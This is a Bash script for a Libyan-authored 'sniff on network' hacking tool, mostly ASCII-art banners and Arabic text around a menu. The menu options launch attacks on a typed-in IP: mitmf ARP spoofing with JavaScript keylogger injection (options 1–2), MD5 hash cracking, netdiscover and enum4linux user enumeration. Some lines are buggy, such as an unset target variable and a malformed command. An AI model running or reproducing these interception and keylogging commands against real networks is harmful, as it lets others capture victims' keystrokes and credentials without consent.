#!/bin/bash

clear
#DEFINED COLOR SETTINGS
RED=$(tput setaf 9 && tput bold)
GREEN=$(tput setaf 9 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 9 && tput bold)


echo ""
echo ""
echo ""
echo $BLUE"                          "     
echo $BLUE"                         ..:::::::::..		                 "
echo $BLUE"   	               ..:::aad8888888baa:::..	             "
echo $BLUE"   	           .::::d:?88888888888?::8b::::.	         "
echo $BLUE"   	         .:::d8888:?88888888??a888888b:::.	         "
echo $BLUE"   	       .:::d8888888a8888888aa8888888888b:::.	     "
echo $BLUE"   	      ::::dP::::::::88888888888::::::::Yb::::	     "
echo $BLUE"   	     ::::dP:::::::::Y888888888P:::::::::Yb::::	     "
echo $BLUE"   	    ::::d8:::::::::::Y8888888P:::::::::::8b::::	     " 
echo $BLUE"   	   .::::88::::::::::::Y88888P::::::::::::88::::.	 "
echo $BLUE"   	   :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::	 "
echo $BLUE"   	   :::::::Y88888888888P::|::Y88888888888P:::::::	 "
echo $BLUE"   	   ::::::::::::::::888:::|:::888::::::::::::::::	 "
echo $BLUE"   	    :::::::::::::::8888888888888b::::::::::::::	     "
echo $BLUE"   	    :::::::::::::::88888888888888::::::::::::::	     "
echo $BLUE"   	     :::::::::::::d88888888888888::::::::::::: 	     "
echo $BLUE"   	      ::::::::::::88::88::88:::88::::::::::::	     "
echo $BLUE"   	        ::::::::::88::88::88:::88::::::::::	         "
echo $BLUE"   	          ::::::::88::88::P::::88::::::::	         "
echo $BLUE"   	            ::::::88::88:::::::88::::::	             "
echo $BLUE"   	                :::::::::::::::::::	                 "
echo $BLUE"   	                     ::::::::: 	                     "  	
sleep 10  
clear 

echo ""
echo ""
echo ""
echo $RED"  """"""""""""|======[***********                 """"""""""""|======[***********   "
echo $RED"   |   (☻)      \                     |   (☻)      \            "
echo $RED"   |   --\--     \                    |   --\--     \           "
echo $RED"   |______________\_______            |______________\_______   "
echo $RED"   |==[OOOO>]============\            |==[OOOO>]============\   "
echo $RED"   |______________________\           |______________________\  "
echo $RED"   \(@)(@)(@)(@)(@)(@)(@)/            \(@)(@)(@)(@)(@)(@)(@)/   "
echo $RED"    *********************              *********************    "
echo ""                                                                                                                                                       
echo ""
echo $BLUE"  >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
sleep 9
clear


echo ""
echo ""
echo $RED"              ██████ ██████╗██████╗ ██████╗██████╗██████╗███╗     "
echo $RED"              ╚════╝╚════╝ ╚════╝ ╚════╝ ╚════╝╚════╝╚════╝       "
echo $RED"           ██████                                            ██████ "
echo $RED"           ╚════╝         Gihad Alkmaty from Libya           ╚════╝ "
echo $RED"           ██████                                            ██████ "
echo $RED"           ╚════╝        tool  Version 4.0 sniff on network  ╚════╝ " 
echo $RED"           ██████                                            ██████ "                                          
echo $RED"           ╚════╝                                            ╚════╝ "
echo $RED"           ██████               ^________^                   ██████ "
echo $RED"           ╚════╝              | Libya218 |                  ╚════╝ "
echo $RED"           ██████          <)  |____----__|                  ██████ "
echo $RED"           ╚════╝        <-----------||-----                 ╚════╝ "                           
echo $RED"           ██████             =      ||                      ██████ "
echo $RED"           ██████            =       ||-                     ██████ "
echo $RED"           ╚════╝          =         ||- -                   ╚════╝ "
echo $RED"           ██████         =          || - -                  ██████ "
echo $RED"           ╚════╝        =           ||  - -                 ╚════╝ "
echo $RED"           ██████        =                - -                ██████ "
echo $RED"           ╚════╝                           =                ╚════╝ "
echo $RED"           ██████ ██████ ██████╗██████╗ ██████╗██████╗██████╗███╗ "
echo $RED"           ╚════╝╚════╝╚════╝╚════╝ ╚════╝ ╚════╝ ╚════╝╚════╝╚═╝ "
echo ""   
echo ""
echo $BLUE"                      4.0ﺖﻟ​ﺎﺜﻟ​ﺍ ﺭﺍﺪﺻﻻ​ﺍ ﻲﻃﺎﻤﻘﻟ​ﺍ ﺩﺎﻬﺟ ﺓﺍﺩﺍ"
echo ""
echo $BLUE"          facebook ﻰﻠﻋ ﻲﺑﺎﺴﺣ >> https://www.facebook.com/Gihad.Metasploit  "
sleep 6
clear

echo ""
echo $RED"     ,           ,                "
echo $RED"    /  ﻲﻛﺩ ﻚﻴﻠﺧ   \               "
echo $RED"   ((__---,,,---__))              "
echo $RED"      (_) O O (_)_________        "
echo $RED"         \ _ / ﻚﺤﻄﻧﻻ ﻞﻐﺘﺷﺍ|\      "
echo $RED"          o_o \  ﻞﻨﻣﺮﺘﻋ   | \     "
echo $RED"               \   _____  |  *    "
echo $RED"                |||   WW|||       "
echo $RED"                |||     |||       "
 
echo $RED"                ^_^^_^_^^_^_^_^_^_^_^^_^__^_^__^ === ☻"; 
echo $RED"                ☻    1 ﺔﻜﺒﺷ ﻞﺧﺍﺩ ﺓﺰﻬﺟﻻ​ﺍ ﻰﻠﻋ ﺖﻨﺼﺘﻟ​ﺍ   ☻";
echo $RED"                ☻                                    ☻";
echo $RED"                ☻ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ☻";
echo $RED"                ☻   2 ﻲﺳﺎﺳﻻ​ﺍ ﺮﺗﻭﺍﺮﻟ​ﺍ ﺓﺰﻬﺟﺍ ﻰﻠﻋ ﺖﻨﺼﺘﻟ​ﺍ☻";
echo $RED"                ☻  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ☻";
echo $RED"                ☻    3.  hash MD5                    ☻";
echo $RED"                ☻ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ☻";
echo $RED"                ☻    4.  intero  GihadAlkmaty        ☻";
echo $RED"                ☻ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ☻";
echo $RED"                ☻    5. netdiscover                  ☻";
echo $RED"                ☻ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ☻";
echo $RED"                ☻    6   enum4linux                  ☻";
echo $RED"                ☻ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ☻";
echo $RED"                ☻    7  Github GihadAlkmaty          ☻";
echo $RED"                ☻ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ☻";
echo $RED"                ☻    8.  EXIT                        ☻";
echo $RED"                ☻ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ☻"; 
echo $RED"                ☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻☻";
echo $RED"       █████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗╗█████╗ "      
echo $RED"       ╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝  "    
echo $RED"       █████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗█████╗  "
echo $RED"        ════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝╚════╝  "
echo $BLUE"     ﺮﻳﺪﻗ ﻲﺷ ﻞﻛ ﻰﻠﻋ ﺃﻮﻫﻭ ﺪﻤﺤﻟ​ﺍ ﺔﻟﻭ ﻚﻠﻤﻟ​ﺍ ﺔﻟ ﺔﻟ ﻚﻳﺮﺷﻻ ﺃﺪﺣﻭ ﻪﻠﻟ​ﺍ ﻻ​ﺍ ﺔﻟ​ﺍ ﻻ "$STAND  
read menuoption

echo ""
if [ $menuoption = "1" ]; then
echo "ip ?"
read target
mitmf --arp --spoof -i eth0 --gateway 192.168.15.2 --target $target --jskeylogger
echo ""
read -p "ENTER "
bash GihadAlkmaty.sh
else


if [ $menuoption = "2" ]; then
echo "ip"
ls
dig $target any
echo ""
echo ""
mitmf --arp --spoof -i eth0 --gateway 192.168.15.1 --target $target --jskeylogger
echo ""
read -p "ENTER"
bash GihadAlkmaty.sh
else


if [ $menuoption = "3" ]; then
echo "hash"
read target
echo ""
cd /root/Desktop/GihadAlkmaty/hash
python hatdecrypter.py -t 0 -p $target
/root/Desktop/GihadAlkmaty/ bash GihadAlkmaty.sh
else

if [ $menuoption = "4" ]; then
echo " ﻲﻤﺳﺍ ﻂﺣ"
read target
echo ""
cd /root/Desktop/GihadAlkmaty/intero
timg Gihads.gif 
echo ""
read -p "ENTER"
bash /root/Desktop/GihadAlkmaty/GihadAlkmaty.sh
else

if [ $menuoption = "5" ]; then
echo " ENTER "
read target
echo ""
cd /root/
netdiscover 
echo ""
read -p "ENTER"
bash GihadAlkmaty.sh
else

if [ $menuoption = "6" ]; then
echo " ip ? "
read target
echo ""
cd /root/
enum4linux -U -o $target 
echo ""
read -p "ENTER"
bash GihadAlkmaty.sh
else


if [ $menuoption = "7" ]; then
echo "  ﺪﻳﺮﺗ ﻞﻫ Gihad ^_^  "
read target
echo ""
cd /root/
echo " ok Let's go "
sleep 4
firefox www.Github.com/jihadLkmaty218 
echo ""
read -p "ENTER"
bash GihadAlkmaty.sh
else

<<COMMENT1
عفوأ لكل من يدخل الملف لاتعبت باي ملف او تغير فيه شي عشان يفضل معاك شغل بدون مشاكل 
COMMENT1

if [ $menuoption = "8" ]; then
exit
fi
fi
fi
fi
fi
fi
fi
fi



